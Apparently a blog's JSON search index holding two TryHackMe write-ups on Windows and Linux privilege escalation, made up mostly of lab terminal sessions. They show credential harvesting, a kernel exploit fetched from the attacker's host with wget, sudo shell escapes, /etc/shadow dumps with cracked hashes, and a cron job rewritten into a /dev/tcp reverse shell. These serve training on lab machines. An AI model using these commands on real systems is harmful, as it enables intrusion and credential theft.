[
  
  {
    "title": "TryHackMe: Windows Privilege Escalation",
    "url": "/posts/tryhackme-windows-privilege-escalation/",
    "categories": "",
    "tags": "write-up",
    "date": "2023-07-22 00:00:00 -0700",
    





    
    "snippet": "https://tryhackme.com/room/windowsprivesc201 IntroductionIt is common in penetration tests to have access to Windows hosts with unprivileged users.2 Windows Privilege EscalationSome of the means of...",
    "content": "https://tryhackme.com/room/windowsprivesc201 IntroductionIt is common in penetration tests to have access to Windows hosts with unprivileged users.2 Windows Privilege EscalationSome of the means of escalating privileges on Windows systems include abusing misconfigurations of Windows services or scheduled tasks, excessive privileges assigned to the current user, vulnerable software, or missing Windows security patches. Windows systems typically have two types of users:  Administrators: can change any system configuration parameter and access any file in the system  Standard users: can perform limited tasks, cannot make permanent or essential changes to the system, limited to their own filesSpecial built-in accounts include:  SYSTEM/LocalSystem: used by the OS to perform internal tasks. Has full access to all files and resources on the system with higher privileges than administrators  Local Service: used to run Windows services with minimum privileges, uses anonymous connections over the network  Network service: used to run Windows services with minimum privileges, uses the computer credentials to authenticate through the network3 Harvesting Passwords from Usual SpotsIf a Windows system was deployed as part of a batch via unattended installation, credentials for an administrator account might end up being stored in one of these locations:C:\\Unattend.xmlC:\\Windows\\Panther\\Unattend.xmlC:\\Windows\\Panther\\Unattend\\Unattend.xmlC:\\Windows\\system32\\sysprep.infC:\\Windows\\system32\\sysprep\\sysprep.xmlPasswords might get written into the Powershell command history. To see that history use:[cmd]type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt[powershell]type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txtList other users’ credentials that have been saved on the system:cmdkey /listUse other credentials that have been saved on the system:runas /savecred /user:admin cmd.exeThe IIS web server may used stored credentials, which may be found in:C:\\inetpub\\wwwroot\\web.configC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.configA quick search for database connection strings in a web.config file:type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionStringIf PuTTY is used on the system, it may be storing credentials in the Windows registry (“SimonTatham” is the creator of PuTTY, not the Windows username):reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /sQuestionsPS C:\\Users\\thm-unpriv&gt; type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txtlswhoamiwhoami /privwhoami /groupwhoami /groupscmdkey /?cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5zcmdkey /listcmdkey /delete:thmdc.localcmdkey /listrunas /?type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txtPS C:\\Users\\thm-unpriv&gt; type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString&lt;add connectionStringName=\"LocalSqlServer\" maxEventDetailsLength=\"1073741823\" buffer=\"false\" bufferMode=\"Notification\" name=\"SqlWebEventProvider\" type=\"System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\" /&gt;&lt;add connectionStringName=\"LocalSqlServer\" name=\"AspNetSqlPersonalizationProvider\" type=\"System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" /&gt;&lt;connectionStrings&gt;&lt;add connectionString=\"Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3\" name=\"THM-DB\" /&gt;&lt;/connectionStrings&gt;PS C:\\Users\\thm-unpriv&gt; cmdkey /listCurrently stored credentials:Target: Domain:interactive=WPRIVESC1\\mike.katz                                                                                                              Type: Domain Password                                                                                                                                       User: WPRIVESC1\\mike.katzPS C:\\Users\\thm-unpriv&gt; runas /savecred /user:mike.katz cmd.exe                                                                                             Attempting to start cmd.exe as user \"WPRIVESC1\\mike.katz\" ...C:\\Windows\\system32&gt;type C:\\Users\\mike.katz\\Desktop\\flag.txtTHM{WHAT_IS_MY_PASSWORD}PS C:\\Users\\thm-unpriv&gt; reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s                                                                                                                                                                                                                  HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\My%20ssh%20server                                                                                         ProxyExcludeList    REG_SZ                                                                                                                                  ProxyDNS    REG_DWORD    0x1                                                                                                                                ProxyLocalhost    REG_DWORD    0x0                                                                                                                          ProxyMethod    REG_DWORD    0x0                                                                                                                             ProxyHost    REG_SZ    proxy                                                                                                                                ProxyPort    REG_DWORD    0x50                                                                                                                              ProxyUsername    REG_SZ    thom.smith                                                                                                                       ProxyPassword    REG_SZ    CoolPass2021                                                                                                                     ProxyTelnetCommand    REG_SZ    connect %host %port\\n                                                                                                       ProxyLogToTerm    REG_DWORD    0x1                                                                                                                                                                                                                                                                                  End of search: 10 match(es) found. 4 Other Quick Wins5 Abusing Service Misconfigurations6 Abusing dangerous privileges7 Abusing vulnerable software8 Tools of the Trade9 Conclusion"
  },
  
  {
    "title": "TryHackMe: Linux Privilege Escalation",
    "url": "/posts/tryhackme-linux-privilege-escalation/",
    "categories": "",
    "tags": "write-up",
    "date": "2023-07-03 00:00:00 -0700",
    





    
    "snippet": "https://tryhackme.com/room/linprivesc1 IntroductionElements that may lead to privilege escalation include kernel version, installed applications, supported programming languages, and other users’ p...",
    "content": "https://tryhackme.com/room/linprivesc1 IntroductionElements that may lead to privilege escalation include kernel version, installed applications, supported programming languages, and other users’ passwords.2 What is Privilege EscalationPrivilege escalation is the process of going from a lower permission account to a higher permission one. It can be accomplished through exploitation of a vulnerability, design flaw, or configuration oversight to gain unauthorized access to resources. It is important because initial access doesn’t typically come with administrative rights. Administrative rights are needed for resetting passwords, accessing protected data, editing configurations, enabling persistence, changing privileges, executing commands, etc.3 EnumerationThe following commands might provide information about a system that could help lead to a privilege escalation exploit.  hostname hostname of the machine  uname -a information about the kernel  cat /proc/version information about the kernel, whether a compiler is installed  cat /etc/issue information about the OS  ps aux processes for all users, not attached to a terminal, include user that launched the process  env environmental variables  sudo -l commands the current user can run using sudo  ls -la hidden files  id current user’s privilege level and group memberships  id frank user frank’s privilege level and group memberships  cat /etc/passwd list of users on the system  cat /etc/passwd | cut -d \":\" -f 1 easier to read list of users on the system  cat /etc/passwd | grep home list of real users  history command history including possibly usernames/passwords  ifconfig give information about the networok interfaces of the system  netstat -a show all listening ports and established connections  netstat -at show all tcp connections  netstat -au show all udp connections  netstat -l list ports in listening mode  netstat -s list network usage statistics by protocol  netstat -tp list connections with the service name and PID information  netstat -ano display all sockets, do not resolve names, display timers  find . -name flag1.txt find the file named “flag1.txt” in the current directory  find /home -name flag1.txt find the file names “flag1.txt” in the /home directory  find / -type d -name config find the directory named config under “/”  find / -type f -perm 0777 find files with the 777 permissions (files readable, writable, and executable by all users)  find / -perm a=x find executable files  find /home -user frank find all files for user “frank” under “/home”  find / -mtime 10 find files that were modified in the last 10 days  find / -atime 10 find files that were accessed in the last 10 day  find / -cmin -60 find files changed within the last hour (60 minutes)  find / -amin -60 find files accesses within the last hour (60 minutes)  find / -size +50M find files larger than 50MB  find / -writable -type d 2&gt;/dev/null Find world-writeable folders  find / -perm -222 -type d 2&gt;/dev/null Find world-writeable folders  find / -perm -o w -type d 2&gt;/dev/null Find world-writeable folders  find / -perm -o x -type d 2&gt;/dev/null  Find world-executable folders  find / -name perl* Find perl  find / -name python* Find python  find / -name gcc* Find gcc  find / -perm -u=s -type f 2&gt;/dev/null Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user  find / -type f -perm -04000 -ls 2&gt;/dev/null Find files that have SUID or SGID bits setThis task involves using several of these commands to answer questions about the target system.karen@wade7363:/$ hostnamewade****karen@wade7363:/$ uname -aLinux wade7363 3.**.*-**-******* #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64GNU/Linuxkaren@wade7363:/$ cat /proc/versionLinux version 3.**.*-**-******* (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014karen@wade7363:/$ cat /etc/os-releaseNAME=\"Ubuntu\"VERSION=\"**.**, ****** ****\"ID=ubuntuID_LIKE=debianPRETTY_NAME=\"Ubuntu **.** LTS\"VERSION_ID=\"**.**\"karen@wade7363:/$ python --versionPython *.*.*karen@wade7363:/$ iduid=1001(karen) gid=1001(karen) groups=1001(karen)karen@wade7363:/$ cat /etc/passwd | grep homesyslog:x:101:104::/home/syslog:/bin/falseusbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/falsesaned:x:108:115::/home/saned:/bin/falsematt:x:1000:1000:matt,,,:/home/matt:/bin/bashkaren:x:1001:1001::/home/karen:$ searchsploit linux kernel 3.13.0-24 --cve --exclude=\"(PoC)|/dos/\"Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c$ searchsploit -p 37292Exploit: Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege EscalationURL: https://www.exploit-db.com/exploits/37292Path: /opt/homebrew/opt/exploitdb/share/exploitdb/exploits/linux/local/37292.cCodes: CVE-****-****4 Automated Enumeration ToolsAutomated tools may save time but might also miss some privilege escalation vectors.  LinPeas  LinEnum  LES (Linux Exploit Suggester)  Linux Smart Enumeration  Linux Priv Checker5 Privilege Escalation: Kernel ExploitsThe Linux kernel manages communication between components such as memory and applications. This requires the kernel to have specific privileges. A successful exploit will potentially lead to root privileges. To exploit the kernel; identify the kernel version, find an exploit for that kernel version. A failed kernel exploit can lead to a system crash.This task involves using a kernel exploit to read a flag.┌──(ealder㉿host1)-[~/Downloads]└─$ sudo python3 -m http.server                 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...10.10.69.129 - - [05/Jul/2023 17:44:26] \"GET /37292.c HTTP/1.1\" 200 -karen@wade7363:/tmp$ wget 10.2.53.143:8000/37292.c--2023-07-05 20:44:26--  http://10.2.53.143:8000/37292.cConnecting to 10.2.53.143:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 5119 (5.0K) [text/x-csrc]Saving to: ‘37292.c’100%[=========================================================================&gt;] 5,119 --.-K/s   in 0s      2023-07-05 20:44:26 (514 MB/s) - ‘37292.c’ saved [5119/5119]karen@wade7363:/tmp$ gcc -o ofs 37292.ckaren@wade7363:/tmp$ ./ofsspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# bashroot@wade7363:/tmp#root@wade7363:/tmp# find / -name flag*txt             /home/matt/flag1.txtroot@wade7363:/tmp# cat /home/matt/flag1.txtTHM-**************6 Privilege Escalation: SudoUse sudo -l to check the current user’s sudo permissions. Refer to https://gtfobins.github.io/ for ways to escalate privileges when the current user has sudo rights to a particular application.This task involves abusing sudo rights of the current user to escalate privileges and read a flag.karen@ip-10-10-9-126:/$ sudo -lMatching Defaults entries for karen on ip-10-10-9-126:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser karen may run the following commands on ip-10-10-9-126:    (ALL) NOPASSWD: /usr/bin/find    (ALL) NOPASSWD: /usr/bin/less    (ALL) NOPASSWD: /usr/bin/nanokaren@ip-10-10-9-126:/$ find / -name \"flag2.txt\" 2&gt;/dev/null/home/ubuntu/flag2.txtkaren@ip-10-10-9-126:/$ cat /home/ubuntu/flag2.txtTHM-*********karen@ip-10-10-9-126:/$ sudo less -F /etc/shadow | grep frankfrank:$6$*********************************************************************:18796:0:99999:7:::karen@ip-10-10-9-126:/$ sudo nano /etc/shadow[then copy paste from within nano]karen@ip-10-10-9-126:/$ sudo find . -exec /bin/sh \\; -quit# whoamiroot# cat /etc/shadow | grep frankfrank:$6$*********************************************************************:18796:0:99999:7:::karen@ip-10-10-9-126:/$ sudo less /etc/profile[within less: !/bin/sh]# whoamiroot# cat /etc/shadow | grep frankfrank:$6$*********************************************************************:18796:0:99999:7:::sudo nano[within nano: ctrl+R then ctrl+X then: reset; sh 1&gt;&amp;0 2&gt;&amp;0]# whoamiroot# cat /etc/shadow | grep frankfrank:$6$*********************************************************************:18796:0:99999:7:::7 Privilege Escalation: SUIDSUID (Set-user Identification) allows files to be executed with the permission level of the file owner. SGID (Set-group Identification) allows files to be executed with the permission level of the group owner. If a binary has the SUID bit set, it can potentially be used to access files inaccessible to the current user or to escalate privileges. Refer to https://gtfobins.github.io/ for ways to escalate privileges when the current user can run a binary with the SUID bit set.This task involves abusing a binary with the SUID bit set to escalate privileges and read a flag.karen@ip-10-10-37-191:/$ find / -perm -u=s -type f 2&gt;/dev/null.../usr/bin/base64...karen@ip-10-10-37-191:/$ base64 /etc/shadow | base64 --decode...***********:$6$****************************************************************************************************:18796:0:99999:7:::...┌──(ealder㉿host1)-[~/Downloads]└─$ unshadow passwd.txt shadow.txt  ...***********:$6$****************************************************************************************************:1001:1001::/home/***********:/bin/shuser2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:1002:1002::/home/user2:/bin/shlxd:!:998:100::/var/snap/lxd/common/lxd:/bin/falsekaren:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:1003:1003::/ho...┌──(ealder㉿host1)-[~/Downloads]└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt   Warning: detected hash type \"sha512crypt\", but the string is also recognized as \"HMAC-SHA256\"Use the \"--format=HMAC-SHA256\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])Cost 1 (iteration count) is 5000 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status*********        (karen)     *********        (user2)     test123          (***********)     3g 0:00:00:13 DONE (2023-07-06 00:47) 0.2248g/s 1324p/s 1861c/s 1861C/s paramedic..ellie123Use the \"--show\" option to display all of the cracked passwords reliablySession completed.karen@ip-10-10-52-126:/$ find / -name \"flag3.txt\" 2&gt;/dev/null/home/ubuntu/flag3.txtkaren@ip-10-10-52-126:/$ cat /home/ubuntu/flag3.txtcat: /home/ubuntu/flag3.txt: Permission deniedkaren@ip-10-10-52-126:/$ base64 /home/ubuntu/flag3.txt | base64 --decodeTHM-*******8 Privilege Escalation: CapabilitiesCapabilities provides a way for sysadmins to manage privileges more granularly. Use getcap -r / 2&gt;/dev/null to list enabled capabilities. Refer to https://gtfobins.github.io/ for ways to escalate privileges when the current user has enabled capabilities.karen@ip-10-10-184-172:~$ getcap -r / 2&gt;/dev/null/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/ping = cap_net_raw+ep/home/karen/vim = cap_setuid+ep/home/ubuntu/view = cap_setuid+epkaren@ip-10-10-184-172:~$ /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'# bashroot@ip-10-10-184-172:~# find / -name \"flag4.txt\"/home/ubuntu/flag4.txtroot@ip-10-10-184-172:~# cat /home/ubuntu/flag4.txtTHM-*******9 Privilege Escalation: Cron JobsCron jobs by default run with the privilege of their owners. If a scheduled task runs with root privileges and we can change the script that will be run, that script will run with root privileges. See the system-wide cron jobs cat /etc/crontabkaren@ip-10-10-6-10:~$ cat /etc/crontab...# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )#* * * * *  root /antivirus.sh* * * * *  root antivirus.sh* * * * *  root /home/karen/backup.sh* * * * *  root /tmp/test.py...karen@ip-10-10-6-10:~$ cat /home/karen/backup.sh#!/bin/bashcd /home/admin/1/2/3/Resultszip -r /home/admin/download.zip ./*karen@ip-10-10-6-10:~$ find / -name \"flag5.txt\" 2&gt;/dev/null/home/ubuntu/flag5.txtkaren@ip-10-10-6-10:~$ cat /home/ubuntu/flag5.txtcat: /home/ubuntu/flag5.txt: Permission deniedkaren@ip-10-10-6-10:~$ vi /home/karen/backup.shkaren@ip-10-10-6-10:~$ cat /home/karen/backup.sh#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.2.53.143/6666 0&gt;&amp;1karen@ip-10-10-6-10:~$ chmod 777 /home/karen/backup.sh──(ealder㉿host1)-[~/Downloads]└─$ nc -nlvp 6666listening on [any] 6666 ...connect to [10.2.53.143] from (UNKNOWN) [10.10.6.10] 55212bash: cannot set terminal process group (13073): Inappropriate ioctl for devicebash: no job control in this shellroot@ip-10-10-6-10:~# cat /home/ubuntu/flag5.txtcat /home/ubuntu/flag5.txtTHM-*********cat /etc/shadow...matt:$6$*****************************************************************************************:18798:0:99999:7:::┌──(ealder㉿host1)-[~/Downloads]└─$ vi matt┌──(ealder㉿host1)-[~/Downloads]└─$ cat mattmatt:$6$*****************************************************************************************:18798:0:99999:7:::┌──(ealder㉿host1)-[~/Downloads]└─$ john mattUsing default input encoding: UTF-8Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])Cost 1 (iteration count) is 5000 for all loaded hashesWill run 2 OpenMP threadsProceeding with single, rules:SinglePress 'q' or Ctrl-C to abort, almost any other key for statusAlmost done: Processing the remaining buffered candidate passwords, if any.Proceeding with wordlist:/usr/share/john/password.lst******           (matt)     1g 0:00:00:05 DONE 2/3 (2023-07-07 00:49) 0.1680g/s 1880p/s 1880c/s 1880C/s 123456..ferrisesUse the \"--show\" option to display all of the cracked passwords reliablySession completed.10 Privilege Escalation: PATHPATH is an environmental variable that tells the operating system where to search for executables when they are not built into the shell or defined with an absolute path.karen@ip-10-10-53-18:/$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binkaren@ip-10-10-53-18:/$ find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u...home/*******...tmp...karen@ip-10-10-53-18:/$ find / -name \"flag6.txt\" 2&gt;/dev/null/home/matt/flag6.txtkaren@ip-10-10-53-18:/$ cat /home/matt/flag6.txtcat: /home/matt/flag6.txt: Permission deniedkaren@ip-10-10-53-18:/tmp$ ls -l /home//*******/total 24-rwsr-xr-x 1 root root 16712 Jun 20  2021 test-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.pykaren@ip-10-10-53-18:/tmp$ cat /home/murdoch/thm.py/usr/bin/python3import osimport systry:        os.system(\"thm\")except:        sys.exit()karen@ip-10-10-53-18:/$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binexport PATH=/tmp:$PATHkaren@ip-10-10-53-18:/tmp$ echo $PATH/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binkaren@ip-10-10-53-18:/tmp$ vi /tmp/thmkaren@ip-10-10-53-18:/tmp$ cat /tmp/thmcat /home/matt/flag6.txtkaren@ip-10-10-53-18:/tmp$karen@ip-10-10-53-18:/tmp$karen@ip-10-10-53-18:/tmp$ /home/murdoch/testTHM-73662892911 Privilege Escalation: NFSNFS configuration can be found in /etc/exports. If an NFS share is configured with “no_root_squash”, NFS will not change the root user to “nfsnobody” and will not strip files from operating with root privileges. An attacker could create an executable with SUID bit set and run it on the target system.karen@ip-10-10-39-217:/$ cat /etc/exports/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)root@ip-10-10-181-118:~# showmount -e 10.10.39.217Export list for 10.10.39.217:/home/ubuntu/sharedfolder */tmp                      */home/backup              *root@ip-10-10-181-118:/tmp/backupsonattackermachine# mkdir /tmp/tmponattackermachineroot@ip-10-10-181-118:/tmp/backupsonattackermachine# mount -o rw 10.10.39.217:/tmp/ /tmp/tmponattackermachine/root@ip-10-10-181-118:/tmp/backupsonattackermachine# cd /tmp/tmponattackermachine/karen@ip-10-10-39-217:/tmp$ ./nfsroot@ip-10-10-39-217:/tmp# iduid=0(root) gid=0(root) groups=0(root),1001(karen)root@ip-10-10-39-217:/tmp# whoamirootroot@ip-10-10-39-217:/tmp# find / -name \"flag7.txt\"/home/matt/flag7.txtroot@ip-10-10-39-217:/tmp# cat /home/matt/flag7.txtTHM-********12 Privilege Escalation: Capstone Challenge[leonard@ip-10-10-167-52 ~]$ uname -aLinux ip-10-10-167-52 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux[leonard@ip-10-10-167-52 ~]$ cat /proc/versionLinux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020[leonard@ip-10-10-167-52 ~]$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashmissy:x:1001:1001::/home/missy:/bin/bash[leonard@ip-10-10-167-52 ~]$ base64 /etc/shadow | base64 --decoderoot:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::──(ealder㉿host1)-[~/Downloads/12]└─$ vi password  ┌──(ealder㉿host1)-[~/Downloads/12]└─$ cat password  root:x:0:0:root:/root:/bin/bashmissy:x:1001:1001::/home/missy:/bin/bash┌──(ealder㉿host1)-[~/Downloads/12]└─$ vi shadow  ┌──(ealder㉿host1)-[~/Downloads/12]└─$ cat shadow  root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::┌──(ealder㉿host1)-[~/Downloads/12]└─$ unshadow password shadow &gt; unshadowed┌──(ealder㉿host1)-[~/Downloads/12]└─$ cat unshadowedroot:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51:0:0:root:/root:/bin/bashmissy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:1001:1001::/home/missy:/bin/bash┌──(ealder㉿host1)-[~/Downloads/12]└─$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowedUsing default input encoding: UTF-8Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])Cost 1 (iteration count) is 5000 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status*********        (missy)[missy@ip-10-10-167-52 ~]$ cat /home/missy/Documents/flag1.txtTHM-**************[missy@ip-10-10-167-52 ~]$ sudo -lMatching Defaults entries for missy on ip-10-10-167-52:    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,    env_reset, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\",    env_keep+=\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\",    env_keep+=\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\",    env_keep+=\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\", env_keep+=\"LC_TIME    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\",    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser missy may run the following commands on ip-10-10-167-52:    (ALL) NOPASSWD: /usr/bin/find[missy@ip-10-10-167-52 ~]$ sudo find /home -exec /bin/bash \\;[root@ip-10-10-167-52 missy]# whoamiroot[root@ip-10-10-167-52 missy]# ls -l /home/rootflag/total 4-rw-r--r--. 1 root root 20 Jun  7  2021 flag2.txt[root@ip-10-10-167-52 missy]# cat /home/rootflag/flag2.txtTHM-***************"
  }
  
]

